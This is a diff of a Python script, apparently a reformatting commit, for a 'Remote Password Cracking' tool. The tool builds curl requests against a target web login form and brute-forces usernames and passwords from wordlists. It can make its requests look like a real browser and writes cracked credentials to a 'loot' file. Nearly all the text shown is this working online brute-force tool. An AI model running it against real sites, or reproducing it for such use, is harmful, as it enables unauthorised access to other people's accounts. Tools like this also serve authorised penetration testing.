@@ -5,71 +5,91 @@ from os import getuid as Priv
 from sys import exit as Exit
 
 """  Handles Errors  """
+
+
 def Handler(error):
     print("[!] " + error)
     Exit(1)
 
+
 """  Check Privileges  """
+
+
 def Escalate():
     uid = Priv()
     if uid != 0:
         Handler("Run as root")
 
+
 """  Parse Command Line Arguments  """
+
+
 def Args():
     ## ARGUMENT PARSER
     parser = AP(description="Remote Password Cracking")
     ## Target Scope
-    parser.add_argument("-t", dest="target",
-        help="specify target remote host")
-    parser.add_argument("-u", dest="uripath",
-        help="specify target uripath")
+    parser.add_argument("-t", dest="target", help="specify target remote host")
+    parser.add_argument("-u", dest="uripath", help="specify target uripath")
     ## Attack Vectors
-    parser.add_argument("-i", dest="inject",
-        help="user=^USER^&pass=^PASS^&submit=submit")
-    parser.add_argument("-m", dest="message",
-        help="F=failed message  <- OR -> S=success message")
+    parser.add_argument(
+        "-i", dest="inject", help="user=^USER^&pass=^PASS^&submit=submit"
+    )
+    parser.add_argument(
+        "-m", dest="message", help="F=failed message  <- OR -> S=success message"
+    )
     ## Header Fields
-    parser.add_argument("-f", dest="formtype",
-        help="specify form type: GET or POST")
-    parser.add_argument("-a", dest="agent",
-        help="specify a custom user agent")
-    parser.add_argument("-r", dest="refpath",
-        help="specify the local referer path")
-    parser.add_argument("-R", dest="referer",
-        help="specify any referer url")
-    parser.add_argument("-c", dest="cookies",
-        help="specify a cookie or string of cookies")
+    parser.add_argument("-f", dest="formtype", help="specify form type: GET or POST")
+    parser.add_argument("-a", dest="agent", help="specify a custom user agent")
+    parser.add_argument("-r", dest="refpath", help="specify the local referer path")
+    parser.add_argument("-R", dest="referer", help="specify any referer url")
+    parser.add_argument(
+        "-c", dest="cookies", help="specify a cookie or string of cookies"
+    )
     ## User Field
-    parser.add_argument("-l", dest="username",
-        help="specify a single username to use")
-    parser.add_argument("-L", dest="userfile",
-        help="specify users wordlist file")
+    parser.add_argument("-l", dest="username", help="specify a single username to use")
+    parser.add_argument("-L", dest="userfile", help="specify users wordlist file")
     ## Password Field
-    parser.add_argument("-p", dest="password",
-        help="specify a single password to use")
-    parser.add_argument("-P", dest="passfile",
-        help="specify a password wordlist file")
+    parser.add_argument("-p", dest="password", help="specify a single password to use")
+    parser.add_argument("-P", dest="passfile", help="specify a password wordlist file")
     ## Output File
-    parser.add_argument("-o", dest="outfile",
-        help="specify output file to write credentials to")
+    parser.add_argument(
+        "-o", dest="outfile", help="specify output file to write credentials to"
+    )
     ## Flags
-    parser.add_argument("-s", dest="secure", action="store_true",
-        help="use https instead of http")
-    parser.add_argument("-b", dest="browser", action="store_true",
-        help="modify request to look like a real browser")
-    parser.add_argument("-U", dest="useronly", action="store_true",
-        help="only brute force users and not passwords")
-    parser.add_argument("-e", dest="exitfast", action="store_true",
-        help="exit after first cracked login")
-    parser.add_argument("-v", dest="verb", action="store_true",
-        help="increase output verbosity")
-    parser.add_argument("-d", dest="debugging", action="store_true",
-        help="debugging dry run")
+    parser.add_argument(
+        "-s", dest="secure", action="store_true", help="use https instead of http"
+    )
+    parser.add_argument(
+        "-b",
+        dest="browser",
+        action="store_true",
+        help="modify request to look like a real browser",
+    )
+    parser.add_argument(
+        "-U",
+        dest="useronly",
+        action="store_true",
+        help="only brute force users and not passwords",
+    )
+    parser.add_argument(
+        "-e",
+        dest="exitfast",
+        action="store_true",
+        help="exit after first cracked login",
+    )
+    parser.add_argument(
+        "-v", dest="verb", action="store_true", help="increase output verbosity"
+    )
+    parser.add_argument(
+        "-d", dest="debugging", action="store_true", help="debugging dry run"
+    )
     args = parser.parse_args()
     return args
 
+
 """  Catches Exceptions  """
+
+
 def Check(args):
     ## Initial Diagnostics
     if not args.target:
@@ -111,6 +131,7 @@ def Check(args):
             if "F=" not in args.message.upper():
                 Handler("Invalid Response Message")
 
+
 def Scope(args, trigger):
     if args.secure:
         prefix = "https://"
@@ -120,6 +141,7 @@ def Scope(args, trigger):
     if trigger == 1:
         url = url + args.uripath
     return url
+
 
 def Agent(args):
     if args.browser:
@@ -134,6 +156,7 @@ def Agent(args):
         else:
             agent = "Anonymous"
     return agent
+
 
 def Middle(url, args):
     body = "Accept: "
@@ -160,6 +183,7 @@ def Middle(url, args):
         body += "Cookie: " + args.cookies + "' -H '"
     return body
 
+
 def Ending(args):
     ending = ""
     if args.browser:
@@ -170,6 +194,7 @@ def Ending(args):
         ending += "Connection: close'"
     return ending
 
+
 def Getter(command, args):
     prefix = command[0]
     payload = command[1] + "?"
@@ -178,12 +203,14 @@ def Getter(command, args):
     cmd = prefix + payload + suffix
     return cmd
 
+
 def Poster(command, args):
     prefix = command[0] + command[1]
     middle = command[2] + " --data '"
     payload = args.inject
     cmd = prefix + middle + payload + "'"
     return cmd
+
 
 def Build(url, args):
     command = []
@@ -201,12 +228,14 @@ def Build(url, args):
         cmd = Poster(command, args)
     return cmd
 
+
 def Load(wordlist, name):
-    with open(wordlist, 'r') as f:
+    with open(wordlist, "r") as f:
         data = f.read().strip()
-    words = data.split('\n')
+    words = data.split("\n")
     print("[+] Loaded <" + str(len(words)) + "> " + name)
     return words
+
 
 def Send(payload, args):
     html = Bash(payload)
@@ -228,6 +257,7 @@ def Send(payload, args):
         else:
             return False
 
+
 def Main():
     Escalate()
     args = Args()
@@ -237,10 +267,10 @@ def Main():
     if args.debugging:
         string = str(args)
         string = string[10:]
-        data = string.split(' ')
+        data = string.split(" ")
         print("\n********  Arguments  ********\n")
         for x in data:
-            x = x[:len(x)-1]
+            x = x[: len(x) - 1]
             print(x)
         print("\n********  Curl Command  ********\n")
         print(cmd)
@@ -250,12 +280,12 @@ def Main():
     if args.useronly:
         users = Load(args.userfile, "users")
         total = len(users)
-        half = total//2
-        quarter = half//2
+        half = total // 2
+        quarter = half // 2
         trips = quarter + half
         for user in users:
             counter += 1
-            #data = Encode(user)
+            # data = Encode(user)
             if " " in user:
                 data = user.replace(" ", "+")
             else:
@@ -272,11 +302,11 @@ def Main():
                     print("[+] ---- 75% ----")
             if Send(payload, args):
                 print("[+] Found: " + user)
-                loot = "U:"+user
+                loot = "U:" + user
                 if args.exitfast:
                     if args.outfile:
-                        f = open(args.outfile, 'w')
-                        f.write(loot+"\n")
+                        f = open(args.outfile, "w")
+                        f.write(loot + "\n")
                         f.close()
                     Exit(1)
                 else:
@@ -290,16 +320,16 @@ def Main():
                 user = username.replace(" ", "+")
             else:
                 user = username
-            #user = Encode(username)
+            # user = Encode(username)
             usercmd = cmd.replace("^USER^", user)
             passwords = Load(args.passfile, "passwords")
             total = len(passwords)
-            half = total//2
-            quarter = half//2
+            half = total // 2
+            quarter = half // 2
             trips = quarter + half
             for password in passwords:
                 counter += 1
-                #pword = Encode(password)
+                # pword = Encode(password)
                 if " " in password:
                     pword = password.replace(" ", "+")
                 else:
@@ -320,11 +350,11 @@ def Main():
                     string = "[+] Found: " + username
                     string += " --> " + password
                     print(string)
-                    loot = "U: "+user+" --> P: "+password
+                    loot = "U: " + user + " --> P: " + password
                     if args.exitfast:
                         if args.outfile:
-                            f = open(args.outfile, 'w')
-                            f.write(loot+"\n")
+                            f = open(args.outfile, "w")
+                            f.write(loot + "\n")
                             f.close()
                         Exit(1)
                     else:
@@ -332,7 +362,7 @@ def Main():
         elif args.password and args.userfile:
             ## single password --> user cracking
             password = args.password
-            #pword = Encode(password)
+            # pword = Encode(password)
             if " " in password:
                 pword = password.replace(" ", "+")
             else:
@@ -340,12 +370,12 @@ def Main():
             passcmd = cmd.replace("^PASS^", pword)
             users = Load(args.userfile, "users")
             total = len(users)
-            half = total//2
-            quarter = half//2
+            half = total // 2
+            quarter = half // 2
             trips = quarter + half
             for user in users:
                 counter += 1
-                #data = Encode(user)
+                # data = Encode(user)
                 if " " in password:
                     data = user.replace(" ", "+")
                 else:
@@ -366,11 +396,11 @@ def Main():
                     string = "[+] Found: " + user
                     string += " --> " + password
                     print(string)
-                    loot = "U: "+user+" --> P: "+password
+                    loot = "U: " + user + " --> P: " + password
                     if args.exitfast:
                         if args.outfile:
-                            f = open(args.outfile, 'w')
-                            f.write(loot+"\n")
+                            f = open(args.outfile, "w")
+                            f.write(loot + "\n")
                             f.close()
                         Exit(1)
                     else:
@@ -379,20 +409,20 @@ def Main():
             ## throw a hail mary
             users = Load(args.userfile, "users")
             total = len(users)
-            half = total//2
-            quarter = half//2
+            half = total // 2
+            quarter = half // 2
             trips = quarter + half
             passwords = Load(args.passfile, "passwords")
             for user in users:
                 counter += 1
-                #uword = Encode(user)
+                # uword = Encode(user)
                 if " " in user:
                     uword = user.replace(" ", "+")
                 else:
                     uword = user
                 usercmd = cmd.replace("^USER^", uword)
                 for password in passwords:
-                    #pword = Encode(password)
+                    # pword = Encode(password)
                     if " " in password:
                         pword = password.replace(" ", "+")
                     else:
@@ -413,11 +443,11 @@ def Main():
                         string = "[+] Found: " + user
                         string += " --> " + password
                         print(string)
-                        loot = "U: "+user+" --> P: "+password
+                        loot = "U: " + user + " --> P: " + password
                         if args.exitfast:
                             if args.outfile:
-                                f = open(args.outfile, 'w')
-                                f.write(loot+"\n")
+                                f = open(args.outfile, "w")
+                                f.write(loot + "\n")
                                 f.close()
                             Exit(1)
                         else:
@@ -425,14 +455,15 @@ def Main():
 
     if creds:
         if args.outfile:
-            f = open(args.outfile, 'w')
+            f = open(args.outfile, "w")
             for cred in creds:
-                f.write(cred+"\n")
+                f.write(cred + "\n")
             f.close()
         else:
             print("\n[+][+]  Loot  [+][+]")
             for cred in creds:
                 print(cred)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     Main()
